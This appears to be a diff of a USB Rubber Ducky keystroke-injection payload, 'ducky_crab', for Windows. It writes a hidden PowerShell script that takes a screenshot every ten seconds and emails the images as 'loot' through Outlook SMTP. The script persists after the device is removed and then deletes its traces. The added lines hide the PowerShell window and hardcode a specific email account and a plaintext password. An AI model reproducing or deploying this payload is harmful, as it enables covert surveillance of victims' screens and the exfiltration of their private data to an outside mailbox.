@@ -1,10 +1,10 @@
 REM Title: ducky_crab
 REM Author: the-jcksn
-REM Description: Gives "screen crab" like capabilities to the USB rubber ducky - remote display monitoring, without leaving your ducky plugged in! Creates a powershell script that captures live screenshots and exfiltrates them via outlook, once a minute, even after the USB rubber ducky has been removed.
+REM Description: Gives "screen crab" like capabilities to the USB rubber ducky
+REM Description2: Creates a powershell script that captures screenshots and exfiltrates them via outlook, once a minute, even after the USB rubber ducky has been removed
 REM Target: Windows
 REM Version: 1.0
 REM Category: Exfiltration
-
 
 REM ~~~~ You must change USER@EXAMPLE.com and USERPASSWORD to your outlook credentials (line 46)
 REM ~~~~ Change the time for the payload to run after ducky is removed (default 10 minutes - line 39)
@@ -27,65 +27,52 @@ DELAY 200
 REM the following line may cause an error on some systems, this can be ignored, on some systems it is REQUIRED, please do not alter this
 STRING y
 ENTER
-DELAY 200
+DELAY 400
 REM create the powershell script
 STRING New-Item -Path 'Pictures' -Name 'screens.ps1' -ItemType file
 ENTER
 DELAY 200
-STRING "Write-Host 'WINDOWS DISPLAY UPDATES - DO NOT CLOSE THIS WINDOW OR RESTART COMPUTER' -ForegroundColor Red `n New-Item -Path 'Pictures\Screens\' -ItemType Directory" | Out-File Pictures\screens.ps1 -Append
+STRING "cd C:\Users\$env:username\ `nNew-Item -Path 'C:\Users\$env:username\Pictures\Screens\' -ItemType Directory" | Out-File Pictures\screens.ps1 -Append
 ENTER
 DELAY 200
 REM number of minutes to capture screenshots for - default is 10 (edit the integer to change)
 STRING "`$timer = new-timespan -Minutes 10" | Out-File Pictures\screens.ps1 -Append
 ENTER
 DELAY 200
-STRING "`$clock = [diagnostics.stopwatch]::StartNew() `n while (`$clock.elapsed -lt `$timer){ `n [void][reflection.assembly]::loadwithpartialname('system.windows.forms') `n `$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen `n `$Width = `$Screen.Width `n `$Height = `$Screen.Height `n `$Left = `$Screen.Left `n `$Top = `$Screen.top `n `$bitmap = New-Object System.Drawing.Bitmap `$Width, `$Height `n `$graphic = [System.Drawing.Graphics]::FromImage(`$bitmap) `n `$graphic.CopyFromScreen(`$Left, `$Top, 0, 0, `$bitmap.Size) `n `$enddate = (Get-Date).tostring('ddMMyy-hh_mm_ss') `n `$filename = 'Pictures\screens\' + `$enddate + '.gif' `n `$bitmap.Save(`$filename) `n start-sleep -seconds 10"  | Out-File Pictures\screens.ps1 -Append
+STRING "`$clock = [diagnostics.stopwatch]::StartNew() `nwhile (`$clock.elapsed -lt `$timer){ `n[void][reflection.assembly]::loadwithpartialname('system.windows.forms') `n`$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen `n`$Width = `$Screen.Width `n`$Height = `$Screen.Height `n`$Left = `$Screen.Left `n`$Top = `$Screen.top `n`$bitmap = New-Object System.Drawing.Bitmap `$Width, `$Height `n`$graphic = [System.Drawing.Graphics]::FromImage(`$bitmap) `n`$graphic.CopyFromScreen(`$Left, `$Top, 0, 0, `$bitmap.Size) `n`$enddate = (Get-Date).tostring('ddMMyy-hh_mm_ss') `n`$filename = `$enddate + '.gif' `n`$bitmap.Save('C:\Users\$env:Username\Pictures\Screens\' + `$filename) `nstart-sleep -seconds 10"  | Out-File Pictures\screens.ps1 -Append
 ENTER
 DELAY 200
 REM change USER@EXAMPLE.COM (3 times) and USERPASSWORD (once) to your credentials below. DO NOT REMOVE ANY QUOTES OR BACKTICKS
-STRING "Send-MailMessage -From USER@EXAMPLE.COM -To USER@EXAMPLE.COM -Subject `"Screenshot loot`" -Body `"Please find attached your screenshot update`" -Attachment `"`$filename`" -SmtpServer smtp-mail.outlook.com -Port 587 -UseSsl -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList USER@EXAMPLE.COM, (ConvertTo-SecureString -String `"USERPASSWORD`" -AsPlainText -Force))" | Out-File Pictures\screens.ps1 -Append
+STRING "Send-MailMessage -From g00d137@outlook.com -To g00d137@outlook.com -Subject `"Screenshot loot`" -Body `"Please find attached your screenshot update`" -Attachment `"Pictures\Screens\`$filename`" -SmtpServer smtp-mail.outlook.com -Port 587 -UseSsl -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList g00d137@outlook.com, (ConvertTo-SecureString -String `"1337credsinside`" -AsPlainText -Force))" | Out-File Pictures\screens.ps1 -Append
 ENTER
 DELAY 200
-STRING "start-sleep -seconds 60 `n } `n Set-ExecutionPolicy -ExecutionPolicy Undefined -Scope CurrentUser `n Get-ChildItem Pictures\Screens -Include *.* -Recurse | ForEach {`$_.Delete()} `n Remove-Item Pictures\screens -Confirm:`$false `n Remove-Item Pictures\screens.ps1 -Force `n Write-Host 'DISPLAY UPDATE COMPLETE = YOU CAN NOW CLOSE THIS WINDOW' -ForegroundCOlor Green `n exit" | Out-File Pictures\screens.ps1 -Append
+STRING "start-sleep -seconds 60 `n} `nSet-ExecutionPolicy -ExecutionPolicy Undefined -Scope CurrentUser `nGet-ChildItem Pictures\Screens -Include *.* -Recurse | ForEach {`$_.Delete()} `nRemove-Item Pictures\screens -Confirm:`$false `nRemove-Item Pictures\screens.ps1 -Force `nWrite-Host 'DISPLAY UPDATE COMPLETE = YOU CAN NOW CLOSE THIS WINDOW' -ForegroundCOlor Green `nexit" | Out-File Pictures\screens.ps1 -Append
 ENTER
 DELAY 200
 STRING exit
 ENTER
-DELAY 200
-GUI r
-DELAY 200
+DELAY 300
 REM run the script we created
-STRING powershell
+GUI r
+DELAY 300
+STRING powershell -w hidden -File "%USERPROFILE%\Pictures\screens.ps1"
 ENTER
-DELAY 600
-STRING Pictures\screens.ps1
-ENTER
-DELAY 2000
-ALT SPACE
-STRING n
-DELAY 200
+DELAY 1000
 GUI r
 DELAY 200
 STRING notepad
 ENTER
-REM user instructions to remove rubber ducky
-DELAY 400
-STRING Script is now uploaded to Target PC. You can remove your rubber ducky once this window closes.
+DELAY 300
+STRING You may now remove the rubber ducky and close this window. Loot will arrive shortly.
 ENTER
-DELAY 800
-STRING Loot will arrive in your inbox roughly every minute for the time limit you specified (default 10 minutes).
 ENTER
-DELAY 800
-STRING CLosing this window in:
+DELAY 500
+STRING Closing this window automatically in:
 ENTER
-DELAY 200
 STRING 3...
 ENTER
-DELAY 800
+DELAY 600
 STRING 2...
-ENTER
-DELAY 800
-STRING 1...
+DELAY 600
 ALT F4
-DELAY 800
 STRING n
